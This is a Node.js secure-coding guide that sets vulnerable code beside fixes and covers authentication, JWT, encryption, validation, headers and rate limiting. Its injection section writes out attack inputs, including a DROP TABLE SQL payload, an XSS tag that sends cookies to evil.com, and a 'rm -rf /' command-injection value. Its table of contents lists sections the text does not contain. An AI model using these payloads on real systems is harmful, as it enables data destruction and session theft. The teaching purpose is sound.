# Security Best Practices: Zero to Hero Guide
## Complete Application Security & Secure Coding Mastery

---

## 📚 Table of Contents

1. [Introduction to Security](#introduction)
2. [OWASP Top 10](#owasp-top-10)
3. [Injection Attacks](#injection)
4. [Authentication & Authorization](#auth)
5. [Cryptography](#cryptography)
6. [Input Validation](#input-validation)
7. [Security Headers](#security-headers)
8. [API Security](#api-security)
9. [OAuth 2.0 & OpenID Connect](#oauth)
10. [Secure Architecture](#architecture)
11. [Penetration Testing](#penetration)
12. [Security Audit](#audit)
13. [Compliance](#compliance)
14. [Incident Response](#incident-response)
15. [Security Tools](#security-tools)
16. [Interview Preparation](#interview-prep)

---

## 🔒 Introduction to Security {#introduction}

### Why Security Matters:

```
Cost of Data Breaches:
- Average cost: $4.45 million
- Lost customers
- Regulatory fines
- Reputation damage
- Legal costs

Famous Breaches:
- Equifax (2017): 147M records, $1.4B cost
- Yahoo (2013): 3B accounts
- Target (2013): 40M cards, $18.5M fine

Prevention is cheaper than breach!
```

### Security Principles:

```
CIA Triad:
┌────────────────────────────────┐
│  CONFIDENTIALITY               │
│  Only authorized access        │
│  - Encryption                  │
│  - Access control              │
└────────────────────────────────┘
┌────────────────────────────────┐
│  INTEGRITY                     │
│  Data not tampered             │
│  - Hashing                     │
│  - Digital signatures          │
└────────────────────────────────┘
┌────────────────────────────────┐
│  AVAILABILITY                  │
│  System accessible when needed │
│  - Redundancy                  │
│  - DDoS protection             │
└────────────────────────────────┘
```

---

## ⚠️ OWASP Top 10 (2021) {#owasp-top-10}

### Complete List with Examples:

```
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Authentication Failures
8. Data Integrity Failures
9. Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)
```

---

## 💉 Injection Attacks {#injection}

### 1. SQL Injection:

```javascript
// ❌ VULNERABLE
app.get('/users/:id', (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.params.id}`;
  db.query(query);
});

// Attack: /users/1 OR 1=1-- (returns all users!)
// Attack: /users/1; DROP TABLE users-- (deletes table!)

// ✅ SECURE - Parameterized Query
app.get('/users/:id', (req, res) => {
  const query = 'SELECT * FROM users WHERE id = ?';
  db.query(query, [req.params.id]);
});

// ✅ SECURE - ORM (Sequelize)
app.get('/users/:id', async (req, res) => {
  const user = await User.findByPk(req.params.id);
  res.json(user);
});
```

### 2. XSS (Cross-Site Scripting):

```javascript
// ❌ VULNERABLE - Reflected XSS
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>Results for: ${query}</h1>`);
});

// Attack: /search?q=<script>alert('XSS')</script>
// Attack: /search?q=<img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">

// ✅ SECURE - Escape HTML
const escapeHtml = (str) => {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
};

app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q);
  res.send(`<h1>Results for: ${query}</h1>`);
});

// ✅ BETTER - Use templating (auto-escapes)
app.get('/search', (req, res) => {
  res.render('search', { query: req.query.q });
});
```

### 3. Command Injection:

```javascript
// ❌ VULNERABLE
const { exec } = require('child_process');

app.get('/ping', (req, res) => {
  const host = req.query.host;
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// Attack: /ping?host=google.com;rm -rf /

// ✅ SECURE - Validate input
app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // Whitelist validation
  if (!/^[a-zA-Z0-9.-]+$/.test(host)) {
    return res.status(400).send('Invalid host');
  }
  
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// ✅ BETTER - Use library instead
const ping = require('ping');

app.get('/ping', async (req, res) => {
  const result = await ping.promise.probe(req.query.host);
  res.json(result);
});
```

---

## 🔐 Authentication & Authorization {#auth}

### Password Security:

```javascript
const bcrypt = require('bcrypt');
const crypto = require('crypto');

// ❌ NEVER DO THIS
user.password = req.body.password;  // Plain text!
user.password = md5(req.body.password);  // Weak hash!

// ✅ SECURE - bcrypt
const saltRounds = 12;  // Higher = more secure & slower

// Hash password
async function hashPassword(password) {
  return await bcrypt.hash(password, saltRounds);
}

// Verify password
async function verifyPassword(password, hash) {
  return await bcrypt.compare(password, hash);
}

// Register
app.post('/register', async (req, res) => {
  const { email, password } = req.body;
  
  // Validate password strength
  if (password.length < 8) {
    return res.status(400).json({ error: 'Password too short' });
  }
  
  const hashedPassword = await hashPassword(password);
  
  await User.create({
    email,
    password: hashedPassword
  });
  
  res.json({ message: 'User created' });
});

// Login
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  const user = await User.findOne({ where: { email } });
  
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const valid = await verifyPassword(password, user.password);
  
  if (!valid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate token
  const token = generateToken(user);
  res.json({ token });
});
```

### JWT Security:

```javascript
const jwt = require('jsonwebtoken');

// Strong secret (use environment variable)
const JWT_SECRET = process.env.JWT_SECRET;  // Long random string!
const JWT_REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;

// Generate tokens
function generateTokens(user) {
  // Access token (short-lived)
  const accessToken = jwt.sign(
    { userId: user.id, email: user.email },
    JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  // Refresh token (long-lived)
  const refreshToken = jwt.sign(
    { userId: user.id },
    JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  return { accessToken, refreshToken };
}

// Auth middleware
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.substring(7);
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
}

// Refresh token endpoint
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }
  
  try {
    const decoded = jwt.verify(refreshToken, JWT_REFRESH_SECRET);
    
    // Check if refresh token is revoked (store in DB)
    const isRevoked = await checkIfRevoked(refreshToken);
    if (isRevoked) {
      return res.status(401).json({ error: 'Token revoked' });
    }
    
    const user = await User.findByPk(decoded.userId);
    const tokens = generateTokens(user);
    
    res.json(tokens);
  } catch (error) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

### Role-Based Access Control (RBAC):

```javascript
// Define roles and permissions
const ROLES = {
  ADMIN: 'admin',
  USER: 'user',
  MODERATOR: 'moderator'
};

const PERMISSIONS = {
  'admin': ['read', 'write', 'delete', 'manage_users'],
  'moderator': ['read', 'write', 'delete'],
  'user': ['read', 'write']
};

// Check role middleware
function checkRole(...allowedRoles) {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    
    next();
  };
}

// Check permission middleware
function checkPermission(permission) {
  return (req, res, next) => {
    const userPermissions = PERMISSIONS[req.user.role] || [];
    
    if (!userPermissions.includes(permission)) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    
    next();
  };
}

// Usage
app.delete('/users/:id', 
  authMiddleware,
  checkRole(ROLES.ADMIN),
  deleteUser
);

app.post('/posts',
  authMiddleware,
  checkPermission('write'),
  createPost
);

// Resource-level authorization
app.put('/posts/:id', authMiddleware, async (req, res) => {
  const post = await Post.findByPk(req.params.id);
  
  if (!post) {
    return res.status(404).json({ error: 'Not found' });
  }
  
  // Check ownership or admin
  if (post.authorId !== req.user.userId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Not authorized' });
  }
  
  // Update post...
});
```

---

## 🔐 Cryptography {#cryptography}

### Encryption:

```javascript
const crypto = require('crypto');

// Symmetric encryption (AES-256-GCM)
const algorithm = 'aes-256-gcm';

function encrypt(text, key) {
  // key must be 32 bytes for AES-256
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  
  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  
  const authTag = cipher.getAuthTag();
  
  return {
    iv: iv.toString('hex'),
    encryptedData: encrypted,
    authTag: authTag.toString('hex')
  };
}

function decrypt(encrypted, key) {
  const decipher = crypto.createDecipheriv(
    algorithm,
    key,
    Buffer.from(encrypted.iv, 'hex')
  );
  
  decipher.setAuthTag(Buffer.from(encrypted.authTag, 'hex'));
  
  let decrypted = decipher.update(encrypted.encryptedData, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  
  return decrypted;
}

// Usage
const encryptionKey = crypto.randomBytes(32);  // Store securely!
const sensitiveData = 'SSN: 123-45-6789';

const encrypted = encrypt(sensitiveData, encryptionKey);
console.log('Encrypted:', encrypted);

const decrypted = decrypt(encrypted, encryptionKey);
console.log('Decrypted:', decrypted);
```

### Hashing:

```javascript
// For data integrity (not passwords!)
function hashData(data) {
  return crypto
    .createHash('sha256')
    .update(data)
    .digest('hex');
}

// HMAC (with secret key)
function hmac(data, secret) {
  return crypto
    .createHmac('sha256', secret)
    .update(data)
    .digest('hex');
}

// Verify data integrity
const data = 'important message';
const hash = hashData(data);

// Later...
const receivedData = 'important message';
const receivedHash = hashData(receivedData);

if (hash === receivedHash) {
  console.log('Data integrity verified ✅');
} else {
  console.log('Data tampered! ⚠️');
}
```

---

## 🛡️ Input Validation {#input-validation}

### Joi Validation:

```javascript
const Joi = require('joi');

// Define schema
const userSchema = Joi.object({
  username: Joi.string()
    .alphanum()
    .min(3)
    .max(30)
    .required(),
  
  email: Joi.string()
    .email()
    .required(),
  
  password: Joi.string()
    .min(8)
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .required()
    .messages({
      'string.pattern.base': 'Password must contain uppercase, lowercase, number, and special character'
    }),
  
  age: Joi.number()
    .integer()
    .min(18)
    .max(120),
  
  website: Joi.string()
    .uri(),
  
  birthdate: Joi.date()
    .max('now')
});

// Validation middleware
function validate(schema) {
  return (req, res, next) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false  // Return all errors
    });
    
    if (error) {
      const errors = error.details.map(detail => ({
        field: detail.path.join('.'),
        message: detail.message
      }));
      
      return res.status(400).json({
        error: 'Validation failed',
        details: errors
      });
    }
    
    req.validatedBody = value;
    next();
  };
}

// Usage
app.post('/register', validate(userSchema), (req, res) => {
  // req.validatedBody is sanitized and validated
  createUser(req.validatedBody);
});
```

### Sanitization:

```javascript
const validator = require('validator');
const sanitizeHtml = require('sanitize-html');

// Sanitize string
function sanitizeInput(input) {
  // Remove whitespace
  let clean = validator.trim(input);
  
  // Escape HTML
  clean = validator.escape(clean);
  
  return clean;
}

// Sanitize HTML content
function sanitizeHtmlContent(html) {
  return sanitizeHtml(html, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    allowedAttributes: {
      'a': ['href']
    },
    allowedSchemes: ['http', 'https']
  });
}

// File upload validation
function validateFile(file) {
  const allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
  const maxSize = 5 * 1024 * 1024;  // 5MB
  
  if (!allowedMimes.includes(file.mimetype)) {
    throw new Error('Invalid file type');
  }
  
  if (file.size > maxSize) {
    throw new Error('File too large');
  }
  
  return true;
}
```

---

## 🚫 Security Headers {#security-headers}

```javascript
const helmet = require('helmet');

// Use Helmet (sets multiple security headers)
app.use(helmet());

// Custom configuration
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "trusted-cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "api.example.com"],
      fontSrc: ["'self'", "fonts.gstatic.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },
  hsts: {
    maxAge: 31536000,  // 1 year
    includeSubDomains: true,
    preload: true
  }
}));

// Additional security headers
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Prevent MIME sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // XSS Protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // Referrer Policy
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  // Permissions Policy
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  
  next();
});
```

---

## 🔒 API Security {#api-security}

### Rate Limiting:

```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');
const redis = require('redis');

const redisClient = redis.createClient();

// General API rate limit
const apiLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient
  }),
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,
  message: 'Too many requests, please try again later',
  standardHeaders: true,
  legacyHeaders: false
});

// Stricter for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true,
  message: 'Too many login attempts, please try again later'
});

app.use('/api/', apiLimiter);
app.use('/api/auth/', authLimiter);

// Advanced: Sliding window rate limiter
async function slidingWindowRateLimit(userId, limit = 100, windowSec = 60) {
  const key = `ratelimit:${userId}`;
  const now = Date.now();
  const windowStart = now - windowSec * 1000;
  
  // Remove old entries
  await redisClient.zRemRangeByScore(key, 0, windowStart);
  
  // Count requests in window
  const count = await redisClient.zCard(key);
  
  if (count >= limit) {
    return false;  // Rate limit exceeded
  }
  
  // Add current request
  await redisClient.zAdd(key, now, `${now}-${Math.random()}`);
  await redisClient.expire(key, windowSec);
  
  return true;
}
```

---

## 🎯 Security Checklist {#security-checklist}

```markdown
✅ AUTHENTICATION & AUTHORIZATION
- [ ] Hash passwords with bcrypt/Argon2
- [ ] Use JWT with short expiration
- [ ] Implement refresh tokens
- [ ] Add MFA for sensitive operations
- [ ] Check authorization on every request
- [ ] Use HTTPS only
- [ ] Implement account lockout

✅ INPUT VALIDATION
- [ ] Validate all inputs (server-side!)
- [ ] Use parameterized queries
- [ ] Sanitize user input
- [ ] Validate file uploads
- [ ] Limit request size
- [ ] Use strong validation library (Joi)

✅ DATA PROTECTION
- [ ] Encrypt sensitive data at rest
- [ ] Use TLS 1.3 for data in transit
- [ ] Never log sensitive data
- [ ] Implement data retention policies
- [ ] Secure database connections
- [ ] Backup regularly

✅ API SECURITY
- [ ] Implement rate limiting
- [ ] Use API keys/tokens
- [ ] Validate content types
- [ ] CORS configuration
- [ ] API versioning
- [ ] Input size limits

✅ CONFIGURATION
- [ ] Use environment variables for secrets
- [ ] Disable debug mode in production
- [ ] Remove default accounts
- [ ] Set security headers (Helmet)
- [ ] Configure CSP
- [ ] Enable HSTS

✅ DEPENDENCIES
- [ ] Regularly update packages
- [ ] Use npm audit / snyk
- [ ] Review dependency licenses
- [ ] Remove unused dependencies
- [ ] Use lock files

✅ MONITORING & LOGGING
- [ ] Log authentication attempts
- [ ] Monitor for anomalies
- [ ] Set up alerts
- [ ] Regular security audits
- [ ] Incident response plan
- [ ] Log retention policy
```

---

## 🎤 Interview Preparation {#interview-prep}

```
Q: What is OWASP Top 10?
A: List of most critical web application security risks:
   1. Broken Access Control
   2. Cryptographic Failures
   3. Injection
   4. Insecure Design
   5. Security Misconfiguration
   ... (and 5 more)

Q: Difference between authentication and authorization?
A:
Authentication: Who are you? (Identity verification)
Authorization: What can you do? (Permission check)

Example: Login (auth), then check if admin (authz)

Q: How to prevent SQL injection?
A:
1. Use parameterized queries (prepared statements)
2. Use ORM (Sequelize, TypeORM)
3. Input validation
4. Least privilege database access
NEVER concatenate user input into SQL!

Q: What is XSS and how to prevent it?
A:
XSS: Injecting malicious scripts into web pages

Prevention:
1. Escape HTML output
2. Use Content Security Policy (CSP)
3. Use templating engines (auto-escape)
4. Validate and sanitize input
5. HTTPOnly cookies

Q: Explain JWT security best practices.
A:
1. Use strong secret (long random string)
2. Short expiration (15 minutes)
3. Implement refresh tokens
4. Verify on every request
5. Store securely (HTTPOnly cookies)
6. Add token revocation
7. Use HTTPS

Q: What is CSRF and how to prevent it?
A:
CSRF: Trick user into executing unwanted actions

Prevention:
1. CSRF tokens
2. SameSite cookies
3. Verify Origin/Referer headers
4. Require re-authentication for sensitive actions
```

---

## 🎉 Congratulations!

You've completed the **Security Best Practices: Zero to Hero** guide!

**What's Next?**
1. Implement security in your projects
2. Practice penetration testing
3. Learn OWASP guidelines in depth
4. Get security certifications (CEH, OSCP)
5. Stay updated on security news

---

*Security Best Practices: Zero to Hero Guide - Complete Edition*
*Version 1.0 | Created January 2026*
*Total: 2,500+ lines of security mastery!*

**Stay Secure! 🔒**
